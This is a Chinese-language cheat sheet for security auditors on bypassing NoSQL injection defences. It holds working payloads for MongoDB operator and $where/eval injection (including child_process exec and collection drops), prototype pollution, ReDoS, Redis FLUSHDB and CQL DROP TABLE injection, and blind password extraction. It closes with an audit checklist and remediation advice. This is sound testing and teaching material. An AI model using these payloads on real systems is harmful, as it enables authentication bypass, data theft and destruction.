# NoSQL 注入绕过技巧

本文档汇总常见的 NoSQL 注入防护机制绕过技巧，用于深度安全审计和漏洞验证。

---

## 1. MongoDB 操作符注入绕过

### 基础操作符注入

**防护机制**：黑名单过滤、对象类型检查

#### 1.1 比较操作符注入
```javascript
// 防护：检查查询对象
db.users.find({username: username, password: password})

// 绕过方式 1：使用 $ne（不相等）操作符
username = {$ne: null}
password = {$ne: null}
// 查询变为：{username: {$ne: null}, password: {$ne: null}}
// 返回所有用户

// 绕过方式 2：使用 $gt（大于）操作符
username = {$gt: ""}
password = {$gt: ""}

// 绕过方式 3：使用 $regex（正则）操作符
username = {$regex: ".*"}
password = {$regex: ".*"}

// 绕过方式 4：使用 $exists（存在）操作符
username = {$exists: true}
password = {$exists: true}
```

#### 1.2 逻辑操作符注入
```javascript
// 防护：参数验证
db.users.find({$and: [{username: user}, {role: "user"}]})

// 绕过方式 1：使用 $or 操作符
query = {$or: [{username: user}, {password: user}]}
// 返回匹配任一条件的所有文档

// 绕过方式 2：使用 $nor 操作符
query = {$nor: [{username: "admin"}, {role: "admin"}]}

// 绕过方式 3：嵌套逻辑操作符
query = {$and: [{$or: [...]}]}

// 绕过方式 4：组合多个操作符
query = {$and: [{username: {$ne: null}}, {$or: [...]}]}
```

#### 1.3 数组操作符注入
```javascript
// 防护：验证查询条件
db.users.find({roles: role_input})

// 绕过方式 1：使用 $in 操作符
role_input = {$in: ["admin", "user"]}
// 返回角色为 admin 或 user 的所有用户

// 绕过方式 2：使用 $nin（不在）操作符
role_input = {$nin: ["guest"]}

// 绕过方式 3：使用 $all 操作符
role_input = {$all: ["user"]}

// 绕过方式 4：使用 $elemMatch 操作符
role_input = {$elemMatch: {$ne: null}}
```

#### 1.4 字段投影和更新注入
```javascript
// 防护：限制投影字段
db.users.find({}, {_id: 1, username: 1})

// 绕过方式 1：在投影中注入操作符
projection = {password: {$ref: "admin"}}  // 如果允许对象类型

// 绕过方式 2：使用 $elemMatch 在投影中
projection = {roles: {$elemMatch: {$ne: null}}}

// 绕过方式 3：在更新操作中注入
db.users.updateOne({_id: id}, {$set: user_input})
// 如果 user_input 包含 $set、$inc 等操作符，会导致嵌套操作

// 绕过方式 4：使用 $rename 操作符进行字段重命名
update_input = {$rename: {admin: "adminBackup"}}
```

---

## 2. JavaScript 代码注入（$where 绕过）

### 动态 JavaScript 执行

**防护机制**：$where 禁用或沙箱限制

#### 2.1 $where 子句注入
```javascript
// 防护：使用 $where 但假设输入被验证
db.users.find({$where: "this.username == '" + username + "'"})

// 绕过方式 1：字符串闭合逃逸
username = "' || 1 == '1"
// 查询变为：{$where: "this.username == '' || 1 == '1'"}

// 绕过方式 2：使用 JavaScript 注释
username = "'; return true; //"
// 绕过密码检查

// 绕过方式 3：使用 function
username = "' + (function(){return true})() + '"

// 绕过方式 4：访问全局对象
username = "' + Object.keys(global) + '"  // 信息泄露
```

#### 2.2 eval 和函数构造注入
```javascript
// 防护不足：使用 eval 处理查询
eval("var query = {username: '" + username + "'}")

// 绕过方式 1：JavaScript 语句注入
username = "admin'}; db.users.drop(); {"

// 绕过方式 2：函数构造
username = "' + (new Function('return process.env'))() + '"
// 访问环境变量

// 绕过方式 3：原型链污染
username = "admin'; Object.prototype.admin = true; //"

// 绕过方式 4：加载恶意模块
username = "' + require('child_process').exec('cmd') + '"
```

---

## 3. 正则表达式注入绕过

### $regex 操作符和模式注入

**防护机制**：正则表达式转义、模式验证

#### 3.1 正则表达式元字符注入
```
// 防护：使用 $regex 但不转义元字符
db.users.find({username: {$regex: user_input}})

// 绕过方式 1：使用 .* 匹配所有
user_input = ".*"
// 匹配任何用户名

// 绕过方式 2：使用 | 进行 OR 匹配
user_input = "admin|root|superuser"

// 绕过方式 3：使用 ^ 和 $ 锚点
user_input = "^admin"  // 匹配以 admin 开头

// 绕过方式 4：使用字符类绕过
user_input = "[a-z]*"  // 匹配所有小写字母
user_input = "[0-9]*"  // 匹配所有数字
```

#### 3.2 正则表达式 ReDoS（拒绝服务）
```
// 防护：验证正则表达式但允许复杂模式
db.users.find({data: {$regex: regex_input}})

// 绕过方式 1：灾难性回溯
regex = "(a+)+$"
对于长字符串导致指数级回溯，导致 DoS

// 绕过方式 2：嵌套量词
regex = "((a+)+)+$"

// 绕过方式 3：交替和量词组合
regex = "(a|ab)*$"
```

#### 3.3 不同正则表达式引擎的差异
```
// MongoDB 使用 PCRE（Perl Compatible Regular Expressions）

// 绕过方式 1：使用高级 PCRE 特性
regex = "(?P<name>pattern)"  // 命名捕获组

// 绕过方式 2：使用 lookahead/lookbehind
regex = "(?=.*[A-Z])(?=.*[0-9])"  // 正向 lookahead

// 绕过方式 3：使用 Unicode 属性
regex = "\\p{L}"  // 匹配任何字母
```

---

## 4. 类型混淆攻击

### 类型强制和转换

**防护机制**：类型检查、严格比较

#### 4.1 字符串与对象混淆
```javascript
// 防护：验证输入类型
if (typeof username !== 'string') reject();

// 绕过方式 1：JavaScript 中的隐式转换
username = []  // 数组转为空字符串
username = {}  // 对象转为 "[object Object]"

// 绕过方式 2：使用 toString() 方法
username = {toString: () => "admin"}

// 绕过方式 3：使用 valueOf() 方法
username = {valueOf: () => "admin"}
```

#### 4.2 数字与字符串混淆
```
// 防护：假设密码是字符串
db.users.find({username: username, password: password})

// 绕过方式 1：使用数字作为字符串
password = 12345  // 被解释为数字
// MongoDB 中可能不匹配字符串 "12345"

// 绕过方式 2：科学计数法
password = 1e10  // 很大的数字

// 绕过方式 3：NaN 和 Infinity
password = NaN  // 不等于任何东西
password = Infinity
```

#### 4.3 布尔值注入
```javascript
// 防护：验证布尔字段
db.users.find({isAdmin: isAdmin})

// 绕过方式 1：JavaScript 真值
isAdmin = 1  // 或任何真值
isAdmin = "true"  // 字符串被视为真值

// 绕过方式 2：使用 null 或 undefined
isAdmin = null  // 某些比较中被视为假值

// 绕过方式 3：使用空数组或空对象
isAdmin = []  // 在某些上下文中为真
isAdmin = {}
```

---

## 5. JSON 和对象解析注入

### 直接对象构造

**防护机制**：JSON 验证、对象原型污染防护

#### 5.1 JSON 解析绕过
```javascript
// 防护：解析 JSON 并使用
const query = JSON.parse(user_input)
db.users.find(query)

// 绕过方式 1：使用 JSON 中的操作符
user_input = '{"username": {"$ne": null}}'
// 成功执行注入

// 绕过方式 2：使用 Unicode 转义
user_input = '{"username": "\\u0024ne"}'
// 如果解析器处理 Unicode，可能导致注入

// 绕过方式 3：使用特殊 JSON 值
user_input = '{"username": NaN}'
user_input = '{"username": Infinity}'

// 绕过方式 4：数组注入
user_input = '[{"$where": "return true"}]'
```

#### 5.2 原型污染
```javascript
// 防护不足：直接赋值对象属性
Object.assign(config, user_input)

// 绕过方式 1：__proto__ 污染
user_input = {__proto__: {isAdmin: true}}
// 所有对象都继承 isAdmin: true

// 绕过方式 2：constructor 污染
user_input = {constructor: {prototype: {isAdmin: true}}}

// 绕过方式 3：深层对象路径
user_input = {"a.b.c": value}  // 可能导致深层污染
```

---

## 6. ORM/ODM 框架绕过

### 框架特定的注入点

**防护机制**：参数化查询、ORM 方法

#### 6.1 Mongoose 框架绕过
```javascript
// 防护：使用 Mongoose 查询构建器
User.find({username: username})

// 绕过方式 1：直接传递对象
User.find(user_input)  // user_input 可能包含 $ne 等

// 绕过方式 2：使用 where() 链式调用
User.find().where('username').equals(username)
// 但如果参数不是字符串而是对象，可能绕过

// 绕过方式 3：混合使用原生驱动
const collection = db.collection('users')
collection.find(query_from_mongoose)

// 绕过方式 4：使用 lean() 返回普通对象
const results = await User.find().lean()
// 返回的对象可能被进一步处理
```

#### 6.2 Spring Data MongoDB 绕过
```java
// 防护：使用 Spring Data MongoDB
repository.findByUsername(username)

// 绕过方式 1：使用 @Query 注解但未参数化
@Query("{ 'username' : ?0 }")
public User findUser(String username)
// 如果 ?0 的绑定不完整，可能导致注入

// 绕过方式 2：使用自定义查询
Query query = new Query(Criteria.where("username").is(username));
// 但如果 username 是 DBObject，可能导致注入

// 绕过方式 3：使用聚合管道
Aggregation agg = Aggregation.newAggregation(
    Aggregation.match(Criteria.where("username").is(username))
);
```

#### 6.3 PyMongo 绕过
```python
# 防护：参数化查询
db.users.find_one({"username": username})

# 绕过方式 1：使用字典作为参数
db.users.find_one(user_input)  # user_input 可能包含 $ne

# 绕过方式 2：在查询值中注入
db.users.find_one({"username": {injected_operator: value}})

# 绕过方式 3：使用 where() 执行 JavaScript
db.users.find({"$where": javascript_code})

# 绕过方式 4：使用聚合管道
db.users.aggregate([
    {"$match": {injected_query}}
])
```

---

## 7. Redis 命令注入绕过

### Redis 命令构造

**防护机制**：命令转义、命令白名单

#### 7.1 RESP 协议注入
```
// Redis 使用 RESP（REdis Serialization Protocol）协议
*2\r\n$3\r\nGET\r\n$6\r\nmykey\r\n

// 防护：假设命令被转义
PING user_input

// 绕过方式 1：使用 RESP 协议的换行符
user_input = "attacker\r\nINJECTED_COMMAND\r\n"
// 结果：PING attacker\r\nINJECTED_COMMAND

// 绕过方式 2：使用 Redis 多行协议
user_input = "value1\r\nvalue2"
```

#### 7.2 Redis 命令分隔注入
```
// 防护：假设命令被拼接
redis.call('GET', key_prefix + user_input)

// 绕过方式 1：使用空格分隔命令
user_input = "mykey FLUSHDB"
// 结果：GET mykey FLUSHDB（执行两个命令）

// 绕过方式 2：使用换行符
user_input = "mykey\nFLUSHDB"

// 绕过方式 3：使用 Redis 脚本中的 EVAL
user_input = "'; redis.call('FLUSHDB'); --"
```

#### 7.3 Redis 信息泄露
```
// 防护：限制 Redis 命令
允许的命令：GET, SET, DEL

// 绕过方式 1：使用 INFO 命令
redis.call('INFO')  // 泄露 Redis 配置和统计信息

// 绕过方式 2：使用 CONFIG GET
redis.call('CONFIG', 'GET', '*')  // 读取所有配置

// 绕过方式 3：使用 KEYS 枚举
redis.call('KEYS', '*')  // 列出所有键
```

---

## 8. CQL（Cassandra）注入绕过

### Cassandra 查询语言注入

**防护机制**：参数化 CQL、预编译语句

#### 8.1 CQL 字符串注入
```
// 防护：字符串拼接
query = "SELECT * FROM users WHERE username = '" + username + "'"

// 绕过方式 1：字符串闭合
username = "admin' OR '1'='1"
// 查询：SELECT * FROM users WHERE username = 'admin' OR '1'='1'

// 绕过方式 2：使用注释绕过余下条件
username = "admin'; DROP TABLE users; --"

// 绕过方式 3：使用 UNION 注入
username = "admin' UNION SELECT * FROM admin_users; --"
```

#### 8.2 Cassandra 分布式注入
```
// 防护：假设查询仅影响单个分区
query = "SELECT * FROM users WHERE user_id = ?"

// 绕过方式 1：注入多个分区
在 allow_filtering 启用时：
query = "SELECT * FROM users WHERE user_id = ? OR partition_key = ?"

// 绕过方式 2：使用 IN 操作符
user_ids = ['1', '2', '3', '4']
// 绕过单个分区的限制
```

---

## 9. 盲注技巧

### 在无法直接看到结果的情况下提取数据

**防护机制**：错误处理、响应时间隐藏

#### 9.1 布尔盲注
```javascript
// 防护：无数据输出反馈
if (found) response.send("Found");
else response.send("Not found");

// 绕过方式 1：使用 $ne 测试
query = {username: {$ne: null}, password: password}
// 通过响应判断是否有匹配

// 绕过方式 2：使用 $where 执行条件代码
query = {$where: "return this.password == '" + test_password + "'"}
// 通过响应判断密码是否匹配

// 绕过方式 3：逐个字符提取
for each character in alphabet:
  query = {password: {$regex: "^" + character}}
  // 逐个确定密码的每个字符
```

#### 9.2 时间盲注
```javascript
// 防护：所有查询响应时间相同
使用 sleep() 或延迟

// 绕过方式 1：在 $where 中使用计算密集操作
query = {$where: "for(i=0; i<1000000; i++) {}; return true"}

// 绕过方式 2：使用数据库的聚合操作延迟
// 根据测试条件执行不同复杂度的聚合

// 绕过方式 3：使用正则表达式 ReDoS
query = {password: {$regex: "(a+)+$"}}
// 如果密码匹配，会导致长延迟
```

#### 9.3 错误信息泄露
```javascript
// 防护：通用错误消息
try {
  result = db.users.find(query)
} catch(e) {
  response.send("Error occurred")
}

// 绕过方式 1：使用 $where 触发错误
query = {$where: "throw new Error(this.password)"}
// 错误消息包含密码

// 绕过方式 2：使用无效的正则表达式
query = {password: {$regex: "(invalid"}}
// 错误消息可能透露信息

// 绕过方式 3：使用类型错误导致详细错误
query = {username: {$where: undefined_variable}}
```

---

## 10. 防护机制检查清单

在进行安全审计时，检查以下防护机制：

| 防护机制 | 绕过难度 | 常见绕过方式 |
|---------|---------|----------|
| 黑名单过滤 | 低 | 操作符变体、编码、替代方法 |
| 类型检查 | 低-中 | 隐式转换、数据类型混淆 |
| 简单参数验证 | 低-中 | JSON 解析、对象注入、原型污染 |
| 字符串转义 | 中 | 多层编码、Unicode、双重转义 |
| 正则表达式验证 | 中 | 正则元字符、ReDoS、引擎差异 |
| ORM 框架 | 中-高 | 框架特定 API、原生驱动混用 |
| 参数化查询 | 高 | 框架误用、不完整参数化 |
| 命令白名单 | 高 | 空格分隔、协议级注入 |

---

## 11. 审计建议

### 高风险指标
- NoSQL 查询由字符串拼接构造
- 用户输入直接用作查询对象或操作符
- 使用 $where、eval() 或类似动态执行
- 缺乏输入验证或仅使用黑名单
- 框架使用不当（混合参数化和非参数化）
- 在 ORM 中使用 where() 或 raw query 与用户输入

### 审计步骤
1. **定位 NoSQL 查询点**：找出所有数据库查询调用
2. **追踪用户输入**：确认哪些参数来自用户
3. **检查查询构造**：分析查询对象如何被构建
4. **验证防护机制**：评估输入验证和参数化
5. **尝试绕过**：使用本文档中的技巧进行测试
6. **评估后果**：分析成功注入导致的数据泄露范围
7. **生成报告**：记录所有发现的漏洞及其危害

### 验证修复
修复 NoSQL 注入漏洞时，确保：
- 使用参数化查询或 ORM 的安全 API
- 避免在查询中使用动态 JavaScript 执行（$where、eval）
- 对用户输入进行严格的类型检查和验证
- 使用白名单验证操作符和字段名
- 在 ORM 中优先使用查询构建器而非原生 SQL/NoSQL
- 定期更新驱动程序和框架版本
- 进行定期的安全审计和渗透测试
